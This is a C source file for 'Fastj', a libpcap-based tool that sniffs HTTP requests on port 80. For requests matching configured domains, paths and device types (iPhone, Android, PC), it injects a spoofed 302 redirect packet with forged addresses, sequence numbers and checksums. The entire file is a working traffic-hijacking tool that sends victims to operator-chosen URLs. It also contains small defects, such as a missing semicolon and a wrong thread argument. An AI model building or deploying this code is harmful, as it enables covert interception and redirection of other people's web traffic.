#define _GNU_SOURCE
#define APP_NAME        "Fastj"
#define APP_DESC        "Http inject using libpcap"
#define APP_COPYRIGHT    "Copyright (c) 2018"
#define APP_DISCLAIMER    "Write By XiaodongPan."

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#include "picohttpparser.h"
#include "hash.h"
#include "slog.h"
#include "queue.h"


#define BILLION 1000000000L

/*the number of a batch report */
#define REPORT_BATCH_NUM 1000

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* read from uri need buffer line */
#define INPUT_BUF_LEN 1024

/* max url length, longer than 480 will be skiped */
#define MAX_URL_LEN 480

/* max host length */
#define MAX_HOST_LEN 32

/* url buffer length, should > MAX_URL_LEN+30 */
#define URL_BUF_LEN 512

#define PACKET_BUILD_LEN 1600

#define MAX_QUEUE_SIZE 1024

#define BUF_QUEUE_SIZE (1024+MAX_QUEUE_SIZE)

#define WORK_NUM 4


/*
 * payload buffer length, limit to 512, so url in url.ini will
 * be less than 512-50(the length of other in the 302 header)
 * length(url_302)<400 is a good choise
 * */
#define PAYLOAD_BUF_LEN 512

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN    6



hashtable_t *g_dict;
char g_config[] = "conf/online.ini";
pthread_mutex_t g_mutex;


//u_char g_local_mac[] = {0x00, 0x16, 0x3e, 0x30, 0x7d, 0x82};
//u_char g_gateway_mac[] = {0xee, 0xff, 0xff, 0xff, 0xff, 0xff};
uint8_t g_local_mac[] = {0xF8, 0xBC, 0x12, 0x38, 0xA7, 0xBC};
uint8_t g_gateway_mac[] = {0x4c, 0xb1, 0x6c, 0x8b, 0x8f, 0x39};

typedef struct http_header {
    char host[MAX_HOST_LEN];
    char path[MAX_URL_LEN];
    int platform;
} http_header_t;


/* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
    u_char ether_shost[ETHER_ADDR_LEN];    /* source host address */
    u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
    u_char ip_vhl;                 /* version << 4 | header length >> 2 */
    u_char ip_tos;                 /* type of service */
    u_short ip_len;                 /* total length */
    u_short ip_id;                  /* identification */
    u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
    u_char ip_ttl;                 /* time to live */
    u_char ip_p;                   /* protocol */
    u_short ip_sum;                 /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)
#define IP_ADDR_LEN 4

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
    u_short th_sport;               /* source port */
    u_short th_dport;               /* destination port */
    tcp_seq th_seq;                 /* sequence number */
    tcp_seq th_ack;                 /* acknowledgement number */
    u_char th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;                 /* window */
    u_short th_sum;                 /* checksum */
    u_short th_urp;                 /* urgent pointer */
};

typedef  struct work_queues {
    struct DSQueue *pkt_queue;
    struct DSQueue *buf_queue;
}work_queues_t;

typedef  struct send_work_args {
    work_queues_t *wqueues;
    pcap_t *send_handle;
    int id;
}send_work_args_t;

char *get_relocation_url(hashtable_t *dict, http_header_t *header, char *url);

int find_platform(char *agent, size_t len);

int get_http_header(const char *header, size_t header_len, http_header_t *http_header);

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void print_app_banner(void);

void print_app_usage(void);

void swap_bytes(void *a, void *b, size_t width);

int build_packet(u_char *packet, char *relocation_url);

void thread_handle_packet(void *args);

void go_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void read_config(hashtable_t *hash, char *config);

uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len);

uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *srcaddr, uint32_t *destaddr);

char *trim(char *str);

int str2mac(const char *macaddr, unsigned char mac[6]);

int str2mac(const char *macaddr, unsigned char mac[6]) {
    unsigned int m[6];
    if (sscanf(macaddr, "%02x:%02x:%02x:%02x:%02x:%02x",
               &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) {
        printf("Failed to parse mac address '%s'", macaddr);
        return -1;
    } else {
        mac[0] = m[0];
        mac[1] = m[1];
        mac[2] = m[2];
        mac[3] = m[3];
        mac[4] = m[4];
        mac[5] = m[5];
        return 0;
    }
}

uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len) {
    unsigned int cksum;
    int idx;
    int odd;

    cksum = (unsigned int) initcksum;

    odd = len & 1;
    len -= odd;

    for (idx = 0; idx < len; idx += 2) {
        cksum += ((unsigned long) ptr[idx] << 8) + ((unsigned long) ptr[idx + 1]);
    }

    if (odd) {      /* buffer is odd length */
        cksum += ((unsigned long) ptr[idx] << 8);
    }

    /*
     * Fold in the carries
     */

    while (cksum >> 16) {
        cksum = (cksum & 0xFFFF) + (cksum >> 16);
    }

    return cksum;
}

uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *srcaddr, uint32_t *destaddr) {
    uint8_t pseudoheader[12];
    uint16_t calccksum;

    memcpy(&pseudoheader[0], srcaddr, IP_ADDR_LEN);
    memcpy(&pseudoheader[4], destaddr, IP_ADDR_LEN);
    pseudoheader[8] = 0;
    pseudoheader[9] = IPPROTO_TCP;
    pseudoheader[10] = (tcplen >> 8) & 0xFF;
    pseudoheader[11] = (tcplen & 0xFF);

    calccksum = ip_chksum(0, pseudoheader, sizeof(pseudoheader));
    calccksum = ip_chksum(calccksum, tcphead, tcplen);
    calccksum = ~calccksum;
    return calccksum;
}


char *trim(char *str){
    char *p = str;
    char *p1;
    if(p){
        p1 = p + strlen(str) - 1;
        while(*p && isspace(*p)) p++;
        while(p1 > p && isspace(*p1)) *p1-- = '\0';
    }
    return p;
}

void read_config(hashtable_t *hash, char *config) {
    char *domain, *path, *redirect;
    int chance, platform, match;
    char *search = "|";
    char line[INPUT_BUF_LEN];
    int count = 0;

    slog_info(2, "start to load %s ...", config);
    FILE *file = fopen(config, "r");
    if (file != NULL) {
        while (fgets(line, sizeof line, file) != NULL) {
            chance = atoi(strtok(line, search));
            match = atoi(strtok(NULL, search));
            platform = atoi(strtok(NULL, search));
            domain = strtok(NULL, search);
            path = strtok(NULL, search);
            redirect = strtok(NULL, search);
            redirect = trim(redirect);
            //printf("%s %s --> %s", domain, path, redirect);
            elem_t *elem = (elem_t *) malloc(sizeof(elem_t));
            elem->chance = chance;
            elem->match = match;
            elem->platform = platform;
            strcpy(elem->domain, domain);
            strcpy(elem->path, path);
            strcpy(elem->redirect, redirect);
            elem->next = NULL;

            ht_set(hash, domain, elem);
            count++;
        }
        fclose(file);
        slog_info(2, "load %s finished, total item: %d", config, count);
    } else {
        slog_error(0, "file %s not exist!", config);
    }
}



/* platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc */
/*int find_platform(const char *agent, size_t len) {
    if (memmem(agent,len, "iPhone", 6) != NULL) {
        return 1;
    }

    if (memmem(agent, len, "Android", 7) != NULL ) {
        return 2;
    }

    return 4;
}*/

/* platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc */
/* strstr is faster than memme, and match will not at the end*/
int find_platform(char *agent, size_t len) {
    agent[len-1] = '\0';
    if (strstr(agent, "iPhone") != NULL) {
        return 1;
    }

    if (strstr(agent, "Android") != NULL ) {
        return 2;
    }

    return 4;
}

char *get_relocation_url(hashtable_t *dict, http_header_t *header, char *url) {
    elem_t *elem = NULL;
    elem = ht_get(dict, header->host);

    // domain not match, return
    if (elem == NULL) {
        return NULL;
    }

    // if have "bro=", skip
    if(strstr(header->path, "bro=") != NULL){
        slog_info(2, "host: %s, path: %s , has bro, skip", header->host, header->path);
        return NULL;
    }

    while (elem != NULL) {
        // reg match
        // platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc
        if (elem->match == 0) {
            if ((strstr(header->path, elem->path) != NULL) &&
                (elem->platform == 0 ||
                 elem->platform == header->platform ||
                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
                sprintf(url, "%s&domain=%s&path=%s", elem->redirect, header->host, header->path);
                return url;

            }
        } else {
            if ((strcmp(header->path, elem->path) == 0) &&
                (elem->platform == 0 ||
                 elem->platform == header->platform ||
                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
                sprintf(url, "%s&domain=%s&path=%s", elem->redirect, header->host, header->path);
                return url;
            }
        }
        elem = elem->next;
    }

    return NULL;
}


/*
 * get http header, the max url length limit to 480, 480+7+16<512
 * */
int get_http_header(const char *header, size_t header_len, http_header_t *http_header) {
    const char *method, *path;
    struct phr_header headers[16];
    size_t method_len, path_len, num_headers;
    int ret = 0, i, minor_version;
    int flag = -3;

    num_headers = 16;
    ret = phr_parse_request(header, header_len, &method, &method_len, &path, &path_len,
                            &minor_version, headers, &num_headers, 0);
    if (path_len > MAX_URL_LEN) {
        slog_debug(3, "path is very long, size: %ld", path_len);
        return flag;
    }

    // copy path to header
    sprintf(http_header->path, "%.*s", (int) path_len, path);
    flag++;


    if (ret == header_len) {
        for (i = 0; i != num_headers; ++i) {
            if (headers[i].name_len == 4 && memcmp("Host", headers[i].name, 4) == 0) {
                sprintf(http_header->host, "%.*s", (int) headers[i].value_len, headers[i].value);
                flag++;
            } else if (headers[i].name_len == 10 && memcmp("User-Agent", headers[i].name, 10) == 0) {
                http_header->platform = find_platform(headers[i].value, headers[i].value_len);
                flag++;
            }

        }
    }
    return flag;
}

/*
 * app name/banner
 */
void print_app_banner(void) {

    printf("%s - %s\n", APP_NAME, APP_DESC);
    printf("%s\n", APP_COPYRIGHT);
    printf("%s\n", APP_DISCLAIMER);
    printf("\n");
}

/*
 * print help text
 */
void print_app_usage(void) {
    printf("Usage: fastj capdev senddev sendmac gatemac\n");
}


void swap_bytes(void *a, void *b, size_t width) {
    char *v1 = (char *) a;
    char *v2 = (char *) b;
    char tmp;
    size_t i;

    for (i = 0; i < width; i++) {
        tmp = v1[i];
        v1[i] = v2[i];
        v2[i] = tmp;
    }
}

int build_packet(u_char *packet, char *relocation_url) {
    struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
    struct sniff_ip *ip;              /* The IP header */
    struct sniff_tcp *tcp;            /* The TCP header */
    char *payload, *option;
    char payload302[PAYLOAD_BUF_LEN];
    int packet_len;
    int size_ip, size_tcp, size_option, size_payload, new_size_payload;
    u_int16_t sport, dport, sum;
    u_int32_t seq, ack;


    // set mac
    ethernet = (struct sniff_ethernet *) (packet);
    memcpy(ethernet->ether_dhost, g_gateway_mac, ETHER_ADDR_LEN);
    memcpy(ethernet->ether_shost, g_local_mac, ETHER_ADDR_LEN);
    slog_debug(4, "%02x:%02x:%02x:%02x:%02x:%02x",
               g_local_mac[0],
               g_local_mac[1],
               g_local_mac[2],
               g_local_mac[3],
               g_local_mac[4],
               g_local_mac[5]);
    slog_debug(4, "%02x:%02x:%02x:%02x:%02x:%02x",
               g_gateway_mac[0],
               g_gateway_mac[1],
               g_gateway_mac[2],
               g_gateway_mac[3],
               g_gateway_mac[4],
               g_gateway_mac[5]);


    // set ip (src, dst, checksum)
    ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    swap_bytes((void *) &ip->ip_src, (void *) &ip->ip_dst, 4);

    // tcp
    tcp = (struct sniff_tcp *) (packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    option = (char *) (packet + SIZE_ETHERNET + size_ip + sizeof(struct sniff_tcp));
    size_option = size_tcp - sizeof(struct sniff_tcp);
    if (size_option > 0) {
        memset(option, 0, size_option);
    }

    slog_debug(3, "option len: %d", size_option);

    sport = tcp->th_sport;
    dport = tcp->th_dport;
    tcp->th_sport = dport;
    tcp->th_dport = sport;
    tcp->th_flags = TH_PUSH | TH_ACK;


    payload = (char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    seq = ntohl(tcp->th_ack);
    ack = ntohl(tcp->th_seq) + size_payload;
    tcp->th_seq = htonl(seq);
    tcp->th_ack = htonl(ack);


    // set payload
    new_size_payload = sprintf(payload302,
                               "HTTP/1.1 302 Moved Temporarily\r\nServer: nginx/1.0\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n\r\n\r\n",
                               relocation_url);
    new_size_payload--;

    memcpy(payload, payload302, new_size_payload);
    ip->ip_len = htons(size_ip + size_tcp + new_size_payload);
    packet_len = SIZE_ETHERNET + size_ip + size_tcp + new_size_payload;

    slog_debug(3, "payload302:%s", payload302);
    slog_debug(3, "size_payload:%d, size_eth: %d, size_ip: %d, size_tcp: %d, packet_len: %d",
               new_size_payload, SIZE_ETHERNET, size_ip, size_tcp, packet_len);

    ip->ip_sum = 0;
    sum = ip_chksum(0, (uint8_t *) ip, size_ip);
    ip->ip_sum = htons(~sum);


    tcp->th_sum = 0;
    sum = tcp_chksum(0, (uint8_t *) tcp, size_tcp + new_size_payload, &(ip->ip_src.s_addr), &(ip->ip_dst.s_addr));
    tcp->th_sum = htons(sum);

    return packet_len;
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    size_t size_pkt, size_ip;
    void *pkt_buf = NULL;
    const struct sniff_ip *ip;
    work_queues_t *wqueues = (work_queues_t *) args;

    static int count = 0;
    static struct timespec old;
    static struct timespec new;
    uint64_t diff_nsec = 0;
    time_t ltime;

    if (count % REPORT_BATCH_NUM == 0) {
        clock_gettime(CLOCK_MONOTONIC, &new);
        if (count != 0) {
            diff_nsec = (BILLION * (new.tv_sec - old.tv_sec));
            diff_nsec += new.tv_nsec - old.tv_nsec;
            float diff_sec = diff_nsec * 1e-9;
            float rate = REPORT_BATCH_NUM / diff_sec;
            ltime = time(NULL);
            slog_info(2, "count:%d, rate:%.3f\n",  count, rate);
        }
        old = new;
    }
    count++;

    if(ds_queue_length(wqueues->pkt_queue) == MAX_QUEUE_SIZE){
        slog_warn(1, "queue full, drop packet");
        return ;
    }

    ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    if (size_ip < 20) {
        slog_warn(1, "  * Invalid IP header length: %u bytes", size_ip);
        return ;
    }

    size_pkt = ntohs(ip->ip_len) + SIZE_ETHERNET;
    if(size_pkt > SNAP_LEN){
        slog_warn(1, "pkt size is too long , size :%d", size_pkt);
        return ;
    }

    slog_info(2, "get_packet , len:%d", size_pkt);
    // get buffer from buffer_queue
    pkt_buf = ds_queue_get(wqueues->buf_queue);
    if(pkt_buf != NULL){
        memcpy(pkt_buf, packet, size_pkt);
        ds_queue_put(wqueues->pkt_queue, pkt_buf);
    } else{
        slog_error(0, "get pkt buffer error");
    }
    return ;
}

/*
 * thread handle packet
 */
//void thread_handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
void thread_handle_packet(void *args) {
    send_work_args_t *work_args  = (send_work_args_t *) args;

    u_char *packet = NULL;
    const struct sniff_ip *ip;              /* The IP header */
    const struct sniff_tcp *tcp;            /* The TCP header */
    const char *payload;                    /* Packet payload */
    char *relocation_url;
    char url_buf[URL_BUF_LEN];
    http_header_t req_http_header;
    int size_ip;
    int size_tcp;
    int size_payload;
    int size_packet;
    int size_send;

    while (1) {
        packet = ds_queue_get(work_args->wqueues->pkt_queue);

        /* define/compute ip header offset */
        ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
        size_ip = IP_HL(ip) * 4;

        /* print source and destination IP addresses */
        slog_debug(4, "       From: %s", inet_ntoa(ip->ip_src));
        slog_debug(4, "         To: %s", inet_ntoa(ip->ip_dst));


        /* define/compute tcp header offset */
        tcp = (struct sniff_tcp *) (packet + SIZE_ETHERNET + size_ip);
        size_tcp = TH_OFF(tcp) * 4;

        if (size_tcp < 20) {
            slog_warn(1, "   * Invalid TCP header length: %u bytes", size_tcp);
            goto free_pkt_buf;
        }


        slog_debug(4, "   Src port: %d", ntohs(tcp->th_sport));
        slog_debug(4, "   Dst port: %d", ntohs(tcp->th_dport));

        /* define/compute tcp payload (segment) offset */
        payload = (char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);

        /* compute tcp payload (segment) size */
        size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

        size_packet = SIZE_ETHERNET + size_ip + size_tcp + size_payload;
        if (size_payload > 0) {
            slog_debug(4, "   Payload (%d bytes):", size_payload);


            // get http header
            int req = get_http_header(payload, size_payload, &req_http_header);
            if (req < 0) {
                slog_debug(4, " http header parse error");
                goto free_pkt_buf;
            }
            slog_info(2, "Host: %s, Path: %s, Platform: %d", req_http_header.host,
                      req_http_header.path, req_http_header.platform)


            // get relocation url
            // 1, hash domain, 2, reg search path,  3, match platform
            relocation_url = get_relocation_url(g_dict, &req_http_header, url_buf);
            //slog_debug(4, "relocation_url:%s\n", relocation_url);

            if (relocation_url == NULL) {
                goto free_pkt_buf;
            }
            slog_info(2, "[t%d] relocation_url:%s", work_args->id, relocation_url);

            //memset(g_packet, PACKET_BUILD_LEN, 0);
            //memcpy(g_packet, packet, size_packet);
            size_send = build_packet(packet, relocation_url);
            if (size_send > 0) {
                pthread_mutex_lock(&g_mutex);
                int send_ret = pcap_sendpacket(work_args->send_handle, packet, size_send);
                pthread_mutex_unlock(&g_mutex);
                if (send_ret == 0) {
                    slog_debug(3, "send packat succ");
                } else {
                    slog_debug(3, "send packat fail");
                }
            }

        }
        free_pkt_buf:
            ds_queue_put(work_args->wqueues->buf_queue, packet);

    }
}

void usr1_list_hashtable(int dummy) {
    slog_info(2, "===== Receive USR1, List Config =======");
    ht_list(g_dict);
    slog_info(2, "=====  List Config End =======");
}

void usr2_reload_config(int dummy) {
    slog_info(2, "===== Receive USR2, Reload Config =======");
    ht_clear(g_dict);
    read_config(g_dict, g_config);
    slog_info(2, "===== Reload Config =======");
}

int main(int argc, char **argv) {
    struct sigaction sa = {.sa_flags = 0,};

    sigemptyset(&sa.sa_mask);       /* clear signal set */
    sigaddset(&sa.sa_mask, SIGUSR1);
    sigaddset(&sa.sa_mask, SIGUSR2);

    sa.sa_handler = usr1_list_hashtable;
    sigaction(SIGUSR1, &sa, NULL);
    sa.sa_handler = usr2_reload_config;
    sigaction(SIGUSR2, &sa, NULL);

    int i;
    void *tmp = NULL;
    char *cap_dev = NULL;            /* capture device name */
    char *send_dev = NULL;
    char *send_mac = NULL;
    char *gate_mac = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];        /* error buffer */
    pcap_t *handle, *send_handle;                /* packet capture handle */
    struct DSQueue *pkt_queue, *buf_queue;
    work_queues_t *wqueues;
    send_work_args_t work_args[WORK_NUM];
    pthread_t tid[WORK_NUM];


    char filter_exp[] = "tcp dst  port 80  and tcp[tcpflags] & tcp-push == tcp-push";
    struct bpf_program fp;            /* compiled filter program (expression) */
    bpf_u_int32 net = 0;            /* ip */
    int num_packets = -1;            /* number of packets to capture */

    print_app_banner();

    // init log
    slog_init("fastj", NULL, 2, 3, 1);


    /* check for capture device name on command-line */
    if (argc == 5) {
        // Usage: fastj capdev senddev sendmac gatemac
        cap_dev = argv[1];
        send_dev = argv[2];
        send_mac = argv[3];
        gate_mac = argv[4];
    } else {
        print_app_usage();
        exit(EXIT_FAILURE);
    }


    /* print capture info */
    slog_info(2, "cap_dev: %s, send_dev: %s, send_mac:%s , gate_mac:%s",
              cap_dev, send_dev, send_mac, gate_mac);
    slog_info(2, "Number of packets: %d", num_packets);
    slog_info(2, "Filter expression: %s", filter_exp);


    if (str2mac(send_mac, g_local_mac) < 0) {
        slog_error(0, "Paser send mac error, mac: %s", send_mac);
        exit(EXIT_FAILURE);
    }

    if (str2mac(gate_mac, g_gateway_mac) < 0) {
        slog_error(0, "Paser gateway mac error, mac: %s", gate_mac);
        exit(EXIT_FAILURE);
    }

    wqueues = (work_queues_t *)malloc(sizeof(work_queues_t));
    if(wqueues == NULL){
        slog_error(0, "create work queues queue error");
        exit(EXIT_FAILURE);
    }

    slog_info(2, "create pkt queue, size :%d", MAX_QUEUE_SIZE);
    pkt_queue = ds_queue_create(MAX_QUEUE_SIZE);
    if(pkt_queue == NULL){
        slog_error(0, "create pkt queue error");
        exit(EXIT_FAILURE);
    }
    wqueues->pkt_queue = pkt_queue;


    buf_queue = ds_queue_create(BUF_QUEUE_SIZE);
    if(buf_queue == NULL){
        slog_error(0, "create pkt queue error");
        exit(EXIT_FAILURE);
    }

    // create buffer queue
    for(i=0; i< BUF_QUEUE_SIZE; i++){
        tmp =malloc(PACKET_BUILD_LEN);
        if(tmp == NULL){
            slog_error(0, "malloc buffer queue error");
            exit(EXIT_FAILURE);
        }
        ds_queue_put(buf_queue, tmp);
    }
    wqueues->buf_queue = buf_queue;

    g_dict = ht_create(65536);
    read_config(g_dict, g_config);

    /* open capture device */
    handle = pcap_open_live(cap_dev, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        slog_error(0, "Couldn't open device %s: %s", cap_dev, errbuf);
        exit(EXIT_FAILURE);
    }



    /* compile the filter expression */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        slog_error(0, "Couldn't parse filter %s: %s",
                   filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* apply the compiled filter */
    if (pcap_setfilter(handle, &fp) == -1) {
        slog_error(0, "Couldn't install filter %s: %s",
                   filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    if (0 != (errno = pthread_mutex_init(&g_mutex, NULL))) {
        fprintf(stderr, "Could not create mutex. Errno: %d\n", errno);
        exit(1);
    }

    send_handle = pcap_open_live(send_dev, SNAP_LEN, 1, 1000, errbuf);
    if (send_handle == NULL) {
        slog_error(0, "Couldn't open device %s: %s", cap_dev, errbuf);
        exit(EXIT_FAILURE);
    }

    for(i=0; i<WORK_NUM; i++){
        work_args[i].id = i;
        work_args[i].wqueues = wqueues;
        /* open send device */
        work_args[i].send_handle = send_handle;
        pthread_create(&tid[i], NULL, thread_handle_packet, &work_args);

    }

    slog_info(2, "start inject...");
    /* now we can set our callback function */
    pcap_loop(handle, num_packets, got_packet, (u_char *) wqueues);

    /* cleanup */
    pcap_freecode(&fp);
    pcap_close(handle);
    pcap_close(send_handle);

    slog_info(2, "Capture complete.");

    return 0;
}

